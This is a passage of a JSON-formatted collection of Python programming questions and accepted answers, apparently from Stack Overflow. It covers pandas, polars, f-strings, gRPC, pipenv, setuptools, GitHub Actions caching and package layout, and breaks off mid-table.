    "AcceptedAnswer": "I hope I've understood your question right. You can transform the event_params column from dict to list of dicts, explode it and transform to new columns key/value:\nfrom ast import literal_eval\n\n\na_df = a_df.assign(\n    event_params=a_df[\"event_params\"].apply(\n        lambda x: [{\"key\": k, \"value\": v} for k, v in literal_eval(x).items()]\n    )\n).explode(\"event_params\")\n\na_df = pd.concat(\n    [a_df, a_df.pop(\"event_params\").apply(pd.Series)],\n    axis=1,\n).drop(columns=0)\n\nprint(a_df)\n\nPrints:\n             date_time user_id account_id     event_name                key                 value\n0  2021-01-03 15:12:42  dhj13h     181d9k   button_click          button_id           shop_screen\n0  2021-01-03 15:12:42  dhj13h     181d9k   button_click   button_container           main_screen\n0  2021-01-03 15:12:42  dhj13h     181d9k   button_click  button_label_text            Enter Shop\n1  2021-01-03 15:12:46  dhj13h     181d9k    screen_view          screen_id        shop_main_page\n1  2021-01-03 15:12:46  dhj13h     181d9k    screen_view  screen_controller  main_view_controller\n1  2021-01-03 15:12:46  dhj13h     181d9k    screen_view       screen_title             Main Menu\n2  2021-01-03 15:13:01  dhj13h     181d9k     close_view          screen_id        shop_main_page\n3  2021-01-03 15:13:12  dhj13h     181d9k   button_click          button_id     back_to_main_menu\n3  2021-01-03 15:13:12  dhj13h     181d9k   button_click   button_container           shop_screen\n3  2021-01-03 15:13:12  dhj13h     181d9k   button_click  button_label_text             Exit Shop\n4  2021-01-03 15:13:13  dhj13h     181d9k       exit_app                NaN                   NaN\n5  2021-01-03 15:13:15  dhj13h     181d9k  uninstall_app                NaN                   NaN\n6  2021-01-04 03:29:01  38nr10     56sf15    install_app       utm_campaign                  null\n6  2021-01-04 03:29:01  38nr10     56sf15    install_app         utm_source                  null\n7  2021-01-04 18:15:14  38nr10     56sf15       exit_app                NaN                   NaN\n8  2021-01-04 18:16:01  38nr10     56sf15  uninstall_app                NaN                   NaN\n\n"
}
{
    "Id": 72405196,
    "PostTypeId": 1,
    "Title": "Append 1 for the first occurence of an item in list p that occurs in list s, and append 0 for the other occurence and other items in s",
    "Body": "I want this code to append 1 for the first occurence of an item in list p that occurs in list s, and append 0 for the other occurence and other items in s.\nThat's my current code below and it is appending 1 for all occurences, I want it to append 1 for the first occurence alone. Please, help\ns = [20, 39, 0, 87, 13, 0, 23, 56, 12, 13]\np = [0, 13]\nbin = []\n\nfor i in s:\n        if i in p:        \n            bin.append(1)      \n        else:\n            bin.append(0)\n   \n\nprint(bin)\n\n# current result [0, 0, 1, 0, 1, 1, 0, 0, 0, 1]\n# excepted result [0, 0, 1, 0, 1, 0, 0, 0, 0, 0]\n\n",
    "AcceptedAnswerId": 72405259,
    "AcceptedAnswer": "The simplest solution is to remove the item from list p if found:\ns = [20, 39, 0, 87, 13, 0, 23, 56, 12, 13]\np = [0, 13]\n\nout = []\nfor i in s:\n    if i in p:\n        out.append(1)\n        p.remove(i)\n    else:\n        out.append(0)\n\nprint(out)\n\nPrints:\n[0, 0, 1, 0, 1, 0, 0, 0, 0, 0]\n\n"
}
{
    "Id": 72449482,
    "PostTypeId": 1,
    "Title": "f-string representation different than str()",
    "Body": "I had always thought that f-strings invoked the __str__ method.  That is, f'{x}' was always the same as str(x).  However, with this class\nclass Thing(enum.IntEnum):\n    A = 0\n\nf'{Thing.A}' is '0' while str(Thing.A) is 'Thing.A'.  This example doesn't work if I use enum.Enum as the base class.\nWhat functionality do f-strings invoke?\n",
    "AcceptedAnswerId": 72449614,
    "AcceptedAnswer": "From \"Formatted string literals\" in the Python reference:\nf-strings are invoke the \"format protocol\", same as the format built-in function. It means that the __format__ magic method is called instead of __str__.\nclass Foo:\n    def __repr__(self):\n        return \"Foo()\"\n\n    def __str__(self):\n        return \"A wild Foo\"\n    \n    def __format__(self, format_spec):\n        if not format_spec:\n            return \"A formatted Foo\"\n        return f\"A formatted Foo, but also {format_spec}!\"\n\n>>> foo = Foo()\n>>> repr(foo)\n'Foo()'\n>>> str(foo)\n'A wild Foo'\n>>> format(foo)\n'A formatted Foo'\n>>> f\"{foo}\"\n'A formatted Foo'\n>>> format(foo, \"Bar\")\n'A formatted Foo, but also Bar!'\n>>> f\"{foo:Bar}\"\n'A formatted Foo, but also Bar!'\n\nIf you don't want __format__ to be called, you can specify !s (for str), !r (for repr) or !a (for ascii) after the expression:\n>>> foo = Foo()\n>>> f\"{foo}\"\n'A formatted Foo'\n>>> f\"{foo!s}\"\n'A wild Foo'\n>>> f\"{foo!r}\"\n'Foo()'\n\nThis is occasionally useful with strings:\n>>> key = 'something\\n nasty!'\n>>> error_message = f\"Key not found: {key!r}\"\n>>> error_message\n\"Key not found: 'something\\\\n nasty!'\"\n\n"
}
{
    "Id": 72598852,
    "PostTypeId": 1,
    "Title": "getCacheEntry failed: Cache service responded with 503",
    "Body": "I am trying to check the lint on the gitubaction. my github action steps are as below\n  lint:\n    name: Lint\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v3\n      - name: Set up Python\n        uses: actions/setup-python@v4\n        with:\n          python-version-file: '.python-version'\n          cache: 'pip'\n          cache-dependency-path: 'requirements.txt'\n\nError screenshot   Attached below\n\nCould you please help me how to fix this?\n",
    "AcceptedAnswerId": 72629158,
    "AcceptedAnswer": "lint:\nname: Lint\nruns-on: ubuntu-latest\nsteps:\n  - name: Checkout\n    uses: actions/checkout@v3\n  - name: Set up Python\n    uses: actions/setup-python@v4\n    with:\n      python-version-file: '.python-version'\n  - name: Cache dependencies\n    uses: actions/cache@v3\n    with:\n      path: ~/.cache/pip\n      key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}\n      restore-keys: |\n          ${{ runner.os }}-pip-\n          ${{ runner.os }}-\n\nI too faced the same problem. It is because of the cache server not responding that includes internal server error or any other.\nYou can use actions/cache@v3 instead of the automatic cache by python using cache: 'pip' because the action/cache does the same  but only gives warning on the server error\n"
}
{
    "Id": 72710695,
    "PostTypeId": 1,
    "Title": "Controlling context manager in a meta class",
    "Body": "I would like to know if it's possible to control the context automatically in a metaclass and decorator. I have written a decorator function that creates the stub from the grpc insecure channel:\ndef grpc_factory(grpc_server_address: str):\n    print(\"grpc_factory\")\n    def grpc_connect(func):\n        print(\"grpc_connect\")\n        def grpc_connect_wrapper(*args, **kwargs):\n            with grpc.insecure_channel(grpc_server_address) as channel:\n                stub = AnalyserStub(channel)\n                return func(*args, stub=stub, **kwargs)\n        return grpc_connect_wrapper\n    return grpc_connect\n\nI have then created a metaclass that uses the context manager with every method that starts with grpc_ and then injects the stub into the methods kwargs:\nclass Client(type):\n    @classmethod\n    def __prepare__(metacls, name, bases, **kwargs):\n        return super().__prepare__(name, bases, **kwargs)\n\n    def __new__(cls, name, bases, attrs, **kwargs):\n        if \"grpc_server_address\" not in kwargs:\n            raise ValueError(\"\"\"grpc_server_address is required on client class, see below example\\n\n            class MyClient(AnalyserClient, metaclass=Client, grpc_server_address='localhost:50051')\"\"\")\n        for key, value in attrs.items():\n            if callable(value) and key.startswith(\"grpc_\"):\n                attrs[key] = grpc_factory(kwargs[\"grpc_server_address\"])(value)\n        return super().__new__(cls, name, bases, attrs)\n\nFrom this, I'd like to create all of the methods from the proto file not implemented errors:\nclass AnalyserClient(metaclass=Client, grpc_server_address=\"localhost:50051\"):\n    def grpc_analyse(self, *args, **kwargs):\n        raise NotImplementedError(\"grpc_analyse is not implemented\")\n\nWith a final use case of the class below with the stub placed into the methods args:\nclass AnalyserClient(AC, metaclass=Client, grpc_server_address=\"localhost:50051\"):\n    def grpc_analyse(self, text, stub) -> str:\n        print(\"Analysing text: {}\".format(text))\n        print(\"Stub is \", stub)\n        stub.AnalyseSentiment(text)\n        return \"Analysed\"\n\nI am getting this error which I assume means the channel is no longer open but I'm not sure how this could be done better to ensure all users have a simple interface with safety around using the services defined in the proto file.\ngrpc_factory\ngrpc_connect\ngrpc_factory\ngrpc_connect\nInside grpc_connect_wrapper\nCreated channel\nAnalysing text: Hello World\nStub is  \nERROR:grpc._common:Exception serializing message!\nTraceback (most recent call last):\n  File \"/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/venv/lib/python3.8/site-packages/grpc/_common.py\", line 86, in _transform\n    return transformer(message)\nTypeError: descriptor 'SerializeToString' for 'google.protobuf.pyext._message.CMessage' objects doesn't apply to a 'str' object\nTraceback (most recent call last):\n  File \"run_client.py\", line 27, in \n    client.grpc_analyse(\"Hello World\")\n  File \"/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/grpc_implementation/client/client.py\", line 15, in grpc_connect_wrapper\n    return func(*args, stub=stub, **kwargs)\n  File \"run_client.py\", line 11, in grpc_analyse\n    stub.AnalyseSentiment(text)\n  File \"/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/venv/lib/python3.8/site-packages/grpc/_channel.py\", line 944, in __call__\n    state, call, = self._blocking(request, timeout, metadata, credentials,\n  File \"/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/venv/lib/python3.8/site-packages/grpc/_channel.py\", line 924, in _blocking\n    raise rendezvous  # pylint: disable-msg=raising-bad-type\ngrpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:\n        status = StatusCode.INTERNAL\n        details = \"Exception serializing request!\"\n        debug_error_string = \"None\"\n\nThe proto file is:\nsyntax = \"proto3\";\n\npackage analyse;\noption go_package = \"./grpc_implementation\";\n\nservice Analyser {\n  rpc AnalyseSentiment(SentimentRequest) returns (SentimentResponse) {}\n}\n\nmessage SentimentRequest {\n  string text = 1;\n}\n\nmessage SentimentResponse {\n  string sentiment = 1;\n}\n\nBelow is the class I am trying to emulate after the metaclass has added decorator.\nclass AnalyserClientTrad:\n    def __init__(self, host: str = \"localhost:50051\"):\n        self.host = host\n\n    def grpc_analyse(self, text: str):\n        with grpc.insecure_channel(self.host) as channel:\n            stub = AnalyserStub(channel)\n            response = stub.AnalyseSentiment(SentimentRequest(text=text))\n            return response.sentiment\n\nclient = AnalyserClientTrad()\nprint(client.grpc_analyse(\"Hello, world!\"))\n\nI have further tested this through adding the decorator traditionally which also works:\ndef grpc_factory(grpc_server_address: str):\n    def grpc_connect(func):\n        def grpc_connect_wrapper(*args, **kwargs):\n            with grpc.insecure_channel(grpc_server_address) as channel:\n                stub = AnalyserStub(channel)\n                return func(*args, stub=stub, **kwargs)\n        return grpc_connect_wrapper\n    return grpc_connect\n\n\n\nclass AnalyserClientTradWithDecs:\n    @grpc_factory(\"localhost:50051\")\n    def grpc_analyse(self, text: str, stub: AnalyserStub):\n        response = stub.AnalyseSentiment(SentimentRequest(text=text))\n        return response.sentiment\n\ndef run_client_with_decorator():\n    client = AnalyserClientTradWithDecs()\n    print(client.grpc_analyse(\"Hello, world!\"))\n\nAny help would be appreciated.\n",
    "AcceptedAnswerId": 72725749,
    "AcceptedAnswer": "You have a problem in this part of the code, that your are not setting an expected proto object instead you are setting string\nclass AnalyserClient(AC, metaclass=Client, grpc_server_address=\"localhost:50051\"):\n    def grpc_analyse(self, text, stub) -> str:\n        print(\"Analysing text: {}\".format(text))\n        print(\"Stub is \", stub)\n        stub.AnalyseSentiment(text) #--> Error, use a proto object here.\n        return \"Analysed\"\n\nThe correct way would be to change the line stub.AnalyseSentiment(text) , with\nstub.AnalyseSentiment(SentimentRequest(text=text))\n\n"
}
{
    "Id": 73662432,
    "PostTypeId": 1,
    "Title": "pipenv No such option: --requirements in latest version",
    "Body": "command: pipenv lock --requirements --keep-outdated\noutput:\nUsage: pipenv lock [OPTIONS]\nTry 'pipenv lock -h' for help.\n\nError: No such option: --requirements Did you mean --quiet?\n\nAny idea how to fix this?\n",
    "AcceptedAnswerId": 73681737,
    "AcceptedAnswer": "the -r option on pipenv lock command is deprecated for some time. use the requirements option to generate the requirements.txt\nie:\npipenv requirements > requirements.txt (Default dependencies)\nand to freeze dev dependencies as well use the --dev option\npipenv requirements --dev > dev-requirements.txt\n\nSometimes, you would want to generate a requirements file based on your current environment, for example to include tooling that only supports requirements.txt. You can convert a Pipfile and Pipfile.lock into a requirements.txt file very easily.\n\nsee also: https://pipenv.pypa.io/en/latest/advanced/#generating-a-requirements-txt\n"
}
{
    "Id": 72414481,
    "PostTypeId": 1,
    "Title": "Error in anyjson setup command: use_2to3 is invalid",
    "Body": "#25 3.990   \u00d7 python setup.py egg_info did not run successfully.\n#25 3.990   \u2502 exit code: 1\n#25 3.990   \u2570\u2500> [1 lines of output]\n#25 3.990       error in anyjson setup command: use_2to3 is invalid.\n#25 3.990       [end of output]\n\nThis is a common error which the most common solution to is to downgrade setuptools to below version 58. This was not working for me. I tried installing python3-anyjson but this didn't work either. I'm at a complete loss.. any advice or help is much appreciated.\nIf it matters: this application is legacy spaghetti and I am trying to polish it up for a migration. There's no documentation of any kind.\nThe requirements.txt is as follows:\ncachetools>=2.0.0,<4\ncertifi==2018.10.15\nFlask-Caching\nFlask-Compress\nFlask==2.0.3\ncffi==1.2.1\ndiskcache\nearthengine-api==0.1.239\ngevent==21.12.0\ngoogle-auth>=1.17.2\ngoogle-api-python-client==1.12.1\ngunicorn==20.1.0\nhttplib2.system-ca-certs-locater\nhttplib2==0.9.2\noauth2client==2.0.1\npyasn1-modules==0.2.1\nredis\nrequests==2.18.0\nwerkzeug==2.1.2\nsix==1.13.0\npyasn1==0.4.1\nJinja2==3.1.1\nitsdangerous==2.0.1\n\n\nFlask-Celery-Helper\nFlask-JWT==0.2.0\nFlask-Limiter\nFlask-Mail\nFlask-Migrate\nFlask-Restless==0.16.0\nFlask-SQLAlchemy\nFlask-Script\nFlask-Testing\nFlask==2.0.3\nPillow<=6.2.2\nShapely\nbeautifulsoup4\nboto\ncelery==3.1.23\ngeopy\ngevent==21.12.0\nnumpy<1.17\noauth2client==2.0.1\npasslib\npsycopg2\npyproj<2\npython-dateutil==2.4.1\nscipy\n\n",
    "AcceptedAnswerId": 72774617,
    "AcceptedAnswer": "Downgrading setuptools worked for me\npip install \"setuptools<58.0.0\"\n\nAnd then\npip install django-celery\n\n"
}
{
    "Id": 73166250,
    "PostTypeId": 1,
    "Title": "Why does a recursive Python program not crash my system?",
    "Body": "I've written an R.py script which contains the following two lines:\nimport os\n\nos.system(\"python3 R.py\")\n\nI expected my system to run out of memory after running this script for a few minutes, but it is still surprisingly responsive. Does someone know, what kind of Python interpreter magic is happening here?\n",
    "AcceptedAnswerId": 73216511,
    "AcceptedAnswer": "Preface\nos.system() is actually a call to C\u2019s system().\nHere is what the documentation states:\n\nThe system() function shall behave as if a child process were created\nusing fork(), and the child process invoked the sh utility using\nexecl() as follows:\nexecl(, \"sh\", \"-c\", command, (char *)0);\nwhere  is an unspecified pathname for the sh utility. It\nis unspecified whether the handlers registered with pthread_atfork()\nare called as part of the creation of the child process.\nThe system() function shall ignore the SIGINT and SIGQUIT signals, and\nshall block the SIGCHLD signal, while waiting for the command to\nterminate. If this might cause the application to miss a signal that\nwould have killed it, then the application should examine the return\nvalue from system() and take whatever action is appropriate to the\napplication if the command terminated due to receipt of a signal.\nThe system() function shall not affect the termination status of any\nchild of the calling processes other than the process or processes it\nitself creates.\nThe system() function shall not return until the child process has\nterminated. [Option End]\nThe system() function need not be thread-safe.\n\nSolution\nsystem() creates a child process and exits, there is no stack to be resolved, therefore one would expect this to run as long as resources to do so are available. Furthermore, the operation being of creating a child process is not an intensive one\u2014 the processes aren't using up much resources, but if allowed to run long enough the script will to start to affect general performance and eventually run out of memory to spawn a new child process. Once this occurs the processes will exit.\nExample\nTo demonstrate this, set recursion depth limit to 10 and allow the program to run:\nimport os, sys, inspect\n\nsys.setrecursionlimit(10)\n\nargs = sys.argv[1:]\narg = int(args[0]) if len(args) else 0\n\nstack_depth = len(inspect.stack(0))\n\nprint(f\"Iteration {arg} - at stack depth of {stack_depth}\")\n\narg += 1\n\nos.system(f\"python3 main.py {arg}\")\n\n\nOutputs:\nIteration 0 - at stack depth of 1 - avaialable memory 43337904128 \nIteration 1 - at stack depth of 1 - avaialable memory 43370692608 \nIteration 2 - at stack depth of 1 - avaialable memory 43358756864 \nIteration 3 - at stack depth of 1 - avaialable memory 43339202560 \nIteration 4 - at stack depth of 1 - avaialable memory 43354894336 \nIteration 5 - at stack depth of 1 - avaialable memory 43314974720 \nIteration 6 - at stack depth of 1 - avaialable memory 43232366592 \nIteration 7 - at stack depth of 1 - avaialable memory 43188719616 \nIteration 8 - at stack depth of 1 - avaialable memory 43173384192 \nIteration 9 - at stack depth of 1 - avaialable memory 43286093824 \nIteration 10 - at stack depth of 1 - avaialable memory 43288162304\nIteration 11 - at stack depth of 1 - avaialable memory 43310637056\nIteration 12 - at stack depth of 1 - avaialable memory 43302408192\nIteration 13 - at stack depth of 1 - avaialable memory 43295440896\nIteration 14 - at stack depth of 1 - avaialable memory 43303870464\nIteration 15 - at stack depth of 1 - avaialable memory 43303870464\nIteration 16 - at stack depth of 1 - avaialable memory 43296256000\nIteration 17 - at stack depth of 1 - avaialable memory 43286032384\nIteration 18 - at stack depth of 1 - avaialable memory 43246657536\nIteration 19 - at stack depth of 1 - avaialable memory 43213336576\nIteration 20 - at stack depth of 1 - avaialable memory 43190259712\nIteration 21 - at stack depth of 1 - avaialable memory 43133902848\nIteration 22 - at stack depth of 1 - avaialable memory 43027984384\nIteration 23 - at stack depth of 1 - avaialable memory 43006255104\n...\n\nhttps://replit.com/@pygeek1/os-system-recursion#main.py\nReferences\nhttps://pubs.opengroup.org/onlinepubs/9699919799/functions/system.html\n"
}
{
    "Id": 72712965,
    "PostTypeId": 1,
    "Title": "Does the src/ folder in PyPI packaging have a special meaning or is it only a convention?",
    "Body": "I'm learning how to package Python projects for PyPI according to the tutorial (https://packaging.python.org/en/latest/tutorials/packaging-projects/). For the example project, they use the folder structure:\npackaging_tutorial/\n\u251c\u2500\u2500 LICENSE\n\u251c\u2500\u2500 pyproject.toml\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 src/\n\u2502   \u2514\u2500\u2500 example_package_YOUR_USERNAME_HERE/\n\u2502       \u251c\u2500\u2500 __init__.py\n\u2502       \u2514\u2500\u2500 example.py\n\u2514\u2500\u2500 tests/\n\nI am just wondering why the src/ folder is needed? Does it serve a particular purpose? Could one instead include the package directly in the top folder? E.g. would\npackaging_tutorial/\n\u251c\u2500\u2500 LICENSE\n\u251c\u2500\u2500 pyproject.toml\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 example_package_YOUR_USERNAME_HERE/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u2514\u2500\u2500 example.py\n\u2514\u2500\u2500 tests/\n\nhave any disadvantages or cause complications?\n",
    "AcceptedAnswerId": 72792078,
    "AcceptedAnswer": "There is an interesting blog post about this topic; basically, using src prevents that when running tests from within the project directory, the package source folder gets imported instead of the installed package (and tests should always run against installed packages, so that the situation is the same as for a user).\nConsider the following example project where the name of the package under development is mypkg. It contains an __init__.py file and another DATA.txt non-code resource:\n.\n\u251c\u2500\u2500 mypkg\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 DATA.txt\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 __init__.py\n\u251c\u2500\u2500 pyproject.toml\n\u251c\u2500\u2500 setup.cfg\n\u2514\u2500\u2500 test\n    \u2514\u2500\u2500 test_data.py\n\nHere, mypkg/__init__.py accesses the DATA.txt resource and loads its content:\nfrom importlib.resources import read_text\n  \ndata = read_text('mypkg', 'DATA.txt').strip()  # The content is 'foo'.\n\nThe script test/test_data.py checks that mypkg.data actually contains 'foo':\nimport mypkg\n  \ndef test():\n    assert mypkg.data == 'foo'\n\nNow, running coverage run -m pytest from within the base directory gives the impression that everything is alright with the project:\n$ coverage run -m pytest\n[...]\ntest/test_data.py .                                             [100%]\n\n========================== 1 passed in 0.01s ==========================\n\nHowever, there's a subtle issue. Running coverage run -m pytest invokes pytest via python -m pytest, i.e. using the -m switch. This has a \"side effect\", as mentioned in the docs:\n\n[...] As with the -c option, the current directory will be added to the start of sys.path. [...]\n\nThis means that when importing mypkg in test/test_data.py, it didn't import the installed version but it imported the package from the source tree in mypkg instead.\nNow, let's further assume that we forgot to include the DATA.txt resource in our project specification (after all, there is no MANIFEST.in). So this file is actually not included in the installed version of mypkg (installation e.g. via python -m pip install .). This is revealed by running pytest directly:\n$ pytest\n[...]\n======================= short test summary info =======================\nERROR test/test_data.py - FileNotFoundError: [Errno 2] No such file ...\n!!!!!!!!!!!!!!! Interrupted: 1 error during collection !!!!!!!!!!!!!!!!\n========================== 1 error in 0.13s ===========================\n\nHence, when using coverage the test passed despite the installation of mypkg being broken. The test didn't capture this as it was run against the source tree rather than the installed version. If we had used a src directory to contain the mypkg package, then adding the current working directory via -m would have caused no problems, as there is no package mypkg in the current working directory anymore.\nBut in the end, using src is not a requirement but more of a convention/best practice. For example requests doesn't use src and they still manage to be a popular and successful project.\n"
}
{
    "Id": 73699500,
    "PostTypeId": 1,
    "Title": "python-polars split string column into many columns by delimiter",
    "Body": "In pandas, the following code will split the string from col1 into many columns. is there a way to do this in polars?\nd = {'col1': [\"a/b/c/d\", \"a/b/c/d\"]}\ndf= pd.DataFrame(data=d)\ndf[[\"a\",\"b\",\"c\",\"d\"]]=df[\"col1\"].str.split('/',expand=True)\n\n",
    "AcceptedAnswerId": 73703650,
    "AcceptedAnswer": "Here's an algorithm that will automatically adjust for the required number of columns -- and should be quite performant.\nLet's start with this data.  Notice that I've purposely added the empty string \"\" and a null value - to show how the algorithm handles these values.  Also, the number of split strings varies widely.\nimport polars as pl\ndf = pl.DataFrame(\n    {\n        \"my_str\": [\"cat\", \"cat/dog\", None, \"\", \"cat/dog/aardvark/mouse/frog\"],\n    }\n)\ndf\n\nshape: (5, 1)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 my_str                      \u2502\n\u2502 ---                         \u2502\n\u2502 str                         \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 cat                         \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 cat/dog                     \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 null                        \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502                             \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 cat/dog/aardvark/mouse/frog \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nThe Algorithm\nThe algorithm below may be a bit more than you need, but you can edit/delete/add as you need.\n(\n    df\n    .with_row_count('id')\n    .with_column(pl.col(\"my_str\").str.split(\"/\").alias(\"split_str\"))\n    .explode(\"split_str\")\n    .with_column(\n        (\"string_\" + pl.arange(0, pl.count()).cast(pl.Utf8).str.zfill(2))\n        .over(\"id\")\n        .alias(\"col_nm\")\n    )\n    .pivot(\n        index=['id', 'my_str'],\n        values='split_str',\n        columns='col_nm',\n    )\n    .with_column(\n        pl.col('^string_.*$').fill_null(\"\")\n    )\n)\n\nshape: (5, 7)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 id  \u2506 my_str                      \u2506 string_00 \u2506 string_01 \u2506 string_02 \u2506 string_03 \u2506 string_04 \u2502\n\u2502 --- \u2506 ---                         \u2506 ---       \u2506 ---       \u2506 ---       \u2506 ---       \u2506 ---       \u2502\n\u2502 u32 \u2506 str                         \u2506 str       \u2506 str       \u2506 str       \u2506 str       \u2506 str       \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 0   \u2506 cat                         \u2506 cat       \u2506           \u2506           \u2506           \u2506           \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 cat       \u2506 dog       \u2506           \u2506           \u2506           \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 null                        \u2506           \u2506           \u2506           \u2506           \u2506           \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 3   \u2506                             \u2506           \u2506           \u2506           \u2506           \u2506           